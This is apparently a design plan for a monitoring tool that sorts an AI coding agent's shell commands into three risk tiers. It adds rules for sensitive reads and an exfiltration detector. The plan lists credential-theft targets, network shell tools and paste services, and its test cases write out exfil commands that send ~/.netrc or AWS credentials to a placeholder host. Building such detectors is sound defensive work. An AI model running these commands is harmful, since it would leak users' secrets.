# Tiered command risk classification (`!` / `!!` / `!!!`) + exfiltration detection

Replace the boolean danger flag (red `* `) with a 3-tier risk classifier rendered as
`!` / `!!` / `!!!`, add sensitive-read detection (clipboard, SSH keys, secrets, cloud
credentials) as tier 3, and add a data-exfiltration detector that correlates sensitive
sources with network upload sinks.

Scope: `claude_trail.py` (feed module) only. The hook and the DuckDB store are untouched:
classification happens at render time, so history re-classifies automatically when rules
improve, and the log format does not change.

## Design

### Risk model

```python
@dataclass(frozen=True)
class RiskRule:
    pattern: re.Pattern   # compiled once at module level
    level: int            # 1..3
    reason: str           # short label, shown in the detail view

RISK_RULES: list[RiskRule] = [...]   # ordered, data-driven like COLUMNS

@functools.lru_cache(maxsize=4096)
def classify_risk(cmd: str) -> tuple[int, tuple[str, ...]]:
    """(level, reasons): level = max over matching rules (0 = none),
    reasons = each matching rule's reason, first-seen order, deduped."""
```

- All matching rules contribute a reason; the highest level wins. The lru_cache makes the
  per-frame cost (50 rows x ~40 rules every 300ms) negligible since commands repeat.
- The exfiltration check (phase 3) is a separate function composed into `classify_risk`,
  because it is a correlation (source AND sink), not a single pattern.
- `is_dangerous()` is removed, not shimmed: call sites (`_danger_prefixed`, tests) migrate
  to `classify_risk`. Nothing outside `claude_trail.py` and its tests uses it.
- `DANGEROUS_REDIRECT` + `QUOTED_SPAN_RE` quoted-span stripping is kept as-is and becomes a
  level-2 rule (`reason="writes to an absolute path"`); it needs the pre-strip so it stays
  special-cased next to the rule table, not inside it.

### Rendering

- `_danger_prefixed(cmd, body)` becomes `_risk_prefixed(cmd, body)`:
  level 1 -> `! ` yellow, level 2 -> `!! ` dark_orange, level 3 -> `!!! ` bold red,
  level 0 -> no prefix. Markers are not padded to equal width (the current `* ` is not
  either, and level-0 rows have no prefix anyway).
- Feed shows only the marker. The `Enter` detail view gains a `Risk` metadata row
  (only when level > 0): the styled marker plus the joined reasons, e.g.
  `!!!  reads SSH key material; uploads data to a remote host`.
- Footer, columns, key handling: unchanged.

### Tier assignment of the existing patterns

| Level | Marker | Existing patterns |
|-------|--------|-------------------|
| 1 caution | `!` yellow | `mv`, `cp`, `wget`, `curl -o` (download/overwrite), `pip install`, `npm install` |
| 2 destructive | `!!` dark_orange | `rm`/`rmdir`/`unlink`, `dd`/`mkfs`/`shred`/`truncate`, `chmod`/`chown`/`chgrp`, `kill`/`killall`/`pkill`, `git reset`/`git clean`/`git checkout --`/`git branch -D`, `docker rm`/`rmi`, mutating `systemctl` verbs, `service <name> <verb>`, absolute-path write redirect |
| 3 critical | `!!!` bold red | `sudo`/`su`/`doas`, `curl \| bash` (remote code exec), `dd` writing to a block device (`of=/dev/`), everything in phases 2-3 |

Split the current single alternation into per-tier regexes (one compiled alternation per
rule keeps rule count low; a rule may cover a family, e.g. one level-2 rule for all the
git-destructive forms with reason "destructive git operation").

### Phase 2: sensitive-read rules (all level 3)

Each is one `RiskRule` with a specific reason. Bias toward recall: a false positive is a
red marker in an observability TUI, not a block.

- **Clipboard** (`reads the clipboard`): `xclip -o/-out`, `xsel` with `-o/--output/-b`,
  `wl-paste`, `pbpaste`, `Get-Clipboard` (case-insensitive).
- **SSH material** (`reads SSH key material`): any reference to a `.ssh/` path or to
  `id_rsa|id_ed25519|id_ecdsa|id_dsa` outside `.ssh` (e.g. copied keys). `known_hosts`
  and `.pub` are NOT excluded: touching `~/.ssh` at all is worth the flag.
- **Cloud credentials** (`reads cloud credentials`): `.aws/` paths,
  `aws configure export-credentials`, `.config/gcloud`, `application_default_credentials`,
  `gcloud auth print-access-token`, `az account get-access-token`, `.kube/config`,
  `.docker/config.json`.
- **Secret files** (`reads a secrets file`): `\.env\b` except `.env.example|.env.sample|
  .env.template`, `.netrc`, `.npmrc`, `.pypirc`, `.git-credentials`, `*.pem`, `*.p12`,
  `*.pfx`, `/etc/shadow`, shell history (`.bash_history`, `.zsh_history`),
  browser stores (`Login Data`, `logins.json`, `key4.db`, `Cookies`).
- **Keychains / secret managers** (`queries a keychain`): `secret-tool lookup`,
  `pass show`, `gpg --export-secret-key(s)`, macOS `security find-generic-password|
  find-internet-password|dump-keychain`.
- **Env-var harvesting** (`dumps credential env vars`): `printenv`/`env` piped into a
  filter mentioning `secret|token|key|passw`, and `echo $X` where X matches
  `(?i)(secret|token|key|passw)`.
- **User extension**: optional `.env` key `CLAUDE_TRAIL_SENSITIVE_PATHS` (colon-separated
  substrings, e.g. `personal_kb:.config/mycreds`), parsed once at import via a new
  `_env_str` beside `_env_int`; each substring becomes a level-3 rule
  (`reads a user-listed sensitive path`). Missing/empty = no extra rules.

Note: the TUI flags reads of `.env` files generally, and claude-trail has its own config
`.env`; that self-flagging is acceptable and correct (it IS a config file being read).

### Phase 3: exfiltration detector

Two pattern sets + a correlation:

- `EXFIL_SINKS` (network upload): `curl` with `-d/--data*/-F/--form/-T/--upload-file`,
  `wget --post-data/--post-file`, `nc|ncat|netcat|socat` with a host argument,
  `scp`/`rsync` with a remote (`host:` or `rsync://`) **destination** (last arg),
  `gh gist create`, `aws s3 cp` to `s3://`, `gsutil cp` to `gs://`, `rclone copy/copyto`,
  known paste/drop services (`transfer.sh`, `file.io`, `0x0.st`, `termbin`, `ix.io`,
  `pastebin`), `sendmail`/`mail -s`/`mutt` with attachment or piped stdin, DNS exfil
  shape (`xxd|base64` piped into `dig`/`nslookup`).
- `SENSITIVE_SOURCES`: the phase-2 sensitive-read patterns (reuse the same compiled
  regexes; do not duplicate).

Tiering:
- upload sink alone -> level 2, reason `uploads data to a remote host`
  (`scp notes.txt host:` is worth `!!`, not `!!!`);
- upload sink + sensitive source in the same command, or a sink reading stdin/a file
  (`@file`, `@-`, `-T -`, `--post-file`) fed by a pipe whose left side matches a
  sensitive source -> level 3, reason `possible data exfiltration`.

`detect_exfiltration(cmd) -> tuple[int, str] | None`, composed into `classify_risk`.
False-positive guards to encode in tests: `git push` is NOT a sink; `curl -O url`
(download) is NOT a sink; `curl -d '{"q":1}' localhost:8080` matches the sink rule
(acceptable: it still uploads; localhost exclusion is deliberately NOT attempted, since
`localhost` can be a tunnel).

### Phase 4: `!!!` LLM arbiter (opt-in second opinion)

The heuristic is tuned for recall, so tier 3 will over-fire. An optional arbiter gives each
`!!!` command a second opinion from an impartial LLM that can **confirm** or **downgrade** it,
adding precision without ever hiding a flag (a downgrade dims the marker but the row and its
arbiter rationale stay inspectable).

**Load-bearing constraint: it must be out-of-band.** `classify_risk` runs in the render loop
(50 rows every 300ms) and must stay a pure, synchronous, sub-millisecond function; an LLM call
there would freeze the TUI, and blocking the PostToolUse hook would add seconds of latency to
every tier-3 Bash command. So the arbiter never runs in the feed or the hook. It runs in the
**existing async ingest worker** and writes a verdict to the DuckDB store; the TUI reads the
verdict lazily, reusing the exact `_with_store` / `_load_command_tokens` read-only pattern the
`Tokens` row already uses. Heuristic = instant `!!!`; arbiter = cached, eventually-consistent
refinement shown on `Enter`.

Flow:
1. Ingest sweep finds `tool_use` rows whose heuristic level is 3 and that have no verdict yet
   (bounded volume: tier 3 is rare). Idempotent + singleton via the ingest lock already in place.
2. For each, call the configured arbiter backend with a **minimal, fixed** prompt (the command
   string, its heuristic reasons, cwd; no user files, no project context) and a structured-output
   contract: `{verdict: "confirm"|"downgrade", level: 1..3, rationale: str}`.
3. Persist to a new `arbiter_verdicts` table keyed by `sha256(command)` (+ backend/model/prompt
   version, so a prompt change re-arbitrates; verdicts are a derived cache, rebuildable).
4. TUI: feed shows the heuristic marker, dimmed to the arbiter's level once a verdict exists; the
   `Enter` detail `Risk` row appends `arbiter: confirm/downgrade (rationale)` or `arbiter: pending`.

**Backends (pluggable `ArbiterBackend`, selected by `CLAUDE_TRAIL_ARBITER=off|api|claude-cli|codex`,
default `off`):**

| Backend | Auth | Impartiality | Notes |
|---------|------|--------------|-------|
| `api` (default when on) | `ANTHROPIC_API_KEY` | Controlled system prompt | Cleanest + fastest. Haiku, tool-use for structured output. Raw `httpx` POST, no new SDK dep. |
| `claude-cli` | Existing subscription | Weaker (same vendor) | `claude -p --output-format json --model haiku`. **Must be sanitized:** isolated `CLAUDE_CONFIG_DIR` (no hooks, no MCP, no `CLAUDE.md`), `--disallowedTools Bash`, and a `CLAUDE_TRAIL_ARBITER=1` sentinel the PostToolUse hook short-circuits on, all three preventing the recursion loop where the arbiter's own Bash retriggers the classifier. |
| `codex` | Existing codex login | **Strongest (different vendor)** | `codex exec`. A Claude heuristic judged by a Claude arbiter shares blind spots; an independent model does not. |

The backend is one small interface (`assess(command, reasons, cwd) -> Verdict`) so the three are
interchangeable and a fourth (local Ollama, etc.) is a drop-in. Timeouts + failures degrade to
`arbiter: unavailable` (the heuristic `!!!` always stands on its own); the arbiter can only add
information, never suppress the base flag.

Open question for implementation, not blocking the plan: whether to gate arbitration on *only*
sensitive-read / exfil tier-3 rules (the high-value, low-volume set) rather than every `sudo`.
Default to arbitrating the sensitive/exfil subset to keep call volume and cost near zero.

## Phases

- [ ] 1. Tiered risk core
  - `RiskRule` + `RISK_RULES` + `classify_risk` (lru_cache), split the existing
    `DANGEROUS_PATTERNS` alternation into per-tier rules per the table above; keep the
    redirect special case at level 2; add the `dd of=/dev/` level-3 rule.
  - `_danger_prefixed` -> `_risk_prefixed` with the 3 markers/styles; `Risk` row in
    `build_detail_panel` (marker + joined reasons, omitted at level 0).
  - Remove `is_dangerous`; migrate all tests to assert `(level, reasons)`; add cases
    pinning each tier boundary (mv=1, rm=2, sudo=3, redirect=2, curl|bash=3).
  - Update CLAUDE.md (Conventions + Columns rows mentioning the red `*`).
- [ ] 2. Sensitive-read rules
  - Add the clipboard / SSH / cloud-creds / secret-files / keychain / env-harvest rules
    (level 3, distinct reasons), plus `_env_str` + `CLAUDE_TRAIL_SENSITIVE_PATHS`.
  - Tests: each family true-positive and near-miss false-positive
    (`.env.example` unflagged, `ssh host uptime` unflagged, `aws s3 ls` unflagged,
    `cat ~/.aws/credentials` flagged, `pbpaste` flagged).
  - Update `.env.example` and CLAUDE.md Key Paths for the new key.
- [ ] 3. Exfiltration detector
  - `EXFIL_SINKS`, `detect_exfiltration`, composition into `classify_risk`
    (sink alone = 2, sink + sensitive source = 3).
  - Tests: `curl -d @~/.aws/credentials https://x` = 3 exfil;
    `scp ~/.ssh/id_rsa host:` = 3; `scp notes.txt host:` = 2;
    `cat ~/.netrc | curl -d @- https://x` = 3; `git push` / `curl -O` unflagged as exfil.
- [ ] 4. `!!!` LLM arbiter (opt-in)
  - `ArbiterBackend` interface + `api` / `claude-cli` / `codex` backends, selected by
    `CLAUDE_TRAIL_ARBITER` (default `off`); structured `{verdict, level, rationale}` contract.
  - `arbiter_verdicts` table (keyed by command hash + backend/model/prompt version); arbitration
    pass folded into the ingest sweep (singleton, idempotent, only heuristic-level-3 rows, default
    limited to the sensitive/exfil subset). Failures/timeouts -> `unavailable`, never suppress.
  - TUI: dim the feed marker to the arbiter level once a verdict exists; `Enter` `Risk` row shows
    `arbiter: confirm/downgrade (rationale)` / `pending` / `unavailable`, via the read-only
    `_with_store` path (no duckdb import in the feed/hook).
  - Tests: each backend behind a fake transport (no network/subprocess in CI); confirm downgrade
    lowers the rendered level; `off` is a total no-op; the `claude-cli` sanitized-launch argv
    (isolated config dir, `--disallowedTools Bash`, sentinel) is asserted; recursion sentinel
    short-circuits the hook.
- [ ] 5. Docs + release
  - README: rename "Dangerous Command Detection" to a risk-classification section with
    the tier table, marker legend, sensitive-read families, exfil detector, the arbiter
    (backends, opt-in env, out-of-band + cached semantics), and the
    `CLAUDE_TRAIL_SENSITIVE_PATHS` key; sync CLAUDE.md; bump to 0.7.0
    (user-visible marker change); `uv tool install --force` after merge.

## Verify

pytest -q

(ruff check . must also stay at the 24-error baseline; no new errors.)
